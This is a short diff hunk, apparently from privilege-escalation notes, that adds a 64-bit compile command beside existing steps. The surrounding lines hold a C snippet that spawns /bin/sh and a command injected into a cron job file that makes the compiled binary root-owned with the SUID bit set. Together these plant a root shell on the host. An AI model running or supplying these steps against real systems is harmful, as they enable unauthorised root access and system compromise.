@@ -339,6 +339,7 @@ execl("/bin/sh", "sh", 0);
 
 === compile
 gcc filename.c outputname
+gcc -m64 filename.c outputname
 
 === change the executable’s owner and group as root. It will also set the SUID bit.
 echo “chown root:root /tmp/outputname; chmod u+s /tmp/outputname;”>/path/to/cron/job-file.sh
